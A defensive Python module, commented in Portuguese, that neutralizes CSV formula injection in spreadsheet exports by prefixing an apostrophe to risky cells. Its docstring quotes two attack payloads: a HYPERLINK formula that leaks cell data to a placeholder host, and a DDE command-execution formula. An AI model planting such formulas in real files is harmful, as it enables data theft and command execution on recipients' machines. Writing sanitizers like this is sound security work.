"""
Neutralização de CSV injection (RS08).

Uma célula que começa com `=`, `+`, `-`, `@`, TAB ou CR é interpretada como
FÓRMULA por Excel, LibreOffice e Google Sheets ao abrir o arquivo. Como o
conteúdo das células vem do usuário, alguém pode gravar num registro:

    =HYPERLINK("http://ataque/?d="&A1;"Clique")
    =cmd|'/c calc'!A1

e quem abrir a planilha executa aquilo. O dado sai do sistema íntegro; o estrago
acontece no aplicativo de quem recebe — por isso a defesa é na hora de escrever
o arquivo, não na hora de gravar o registro.

A neutralização padrão é prefixar com apóstrofo, que força o leitor a tratar a
célula como texto.
"""

import re

FORMULA_STARTERS = ("=", "+", "-", "@")

# TAB e CR também iniciam fórmula, mas precisam ser checados no texto CRU: são
# whitespace, então um lstrip() antes da checagem os apagaria e deixaria a
# célula passar limpa. (Foi exatamente o bug que
# test_formula_like_cells_are_neutralized["\tinjetado"] pegou.)
CONTROL_STARTERS = ("\t", "\r")

# Número puro não é fórmula. Sem esta exceção, todo valor negativo sairia como
# '-500 e deixaria de ser numérico na planilha — quebrando somas legítimas.
PLAIN_NUMBER = re.compile(r"^[+-]?\d+(?:[.,]\d+)?$")


def neutralize(text: str) -> str:
    if not text:
        return text

    if text.startswith(CONTROL_STARTERS):
        return f"'{text}"

    # O lstrip cobre " =SUM(A1)": alguns leitores aparam o espaço à esquerda
    # antes de decidir se a célula é fórmula.
    stripped = text.lstrip()
    if not stripped.startswith(FORMULA_STARTERS):
        return text
    if PLAIN_NUMBER.match(stripped):
        return text
    return f"'{text}"
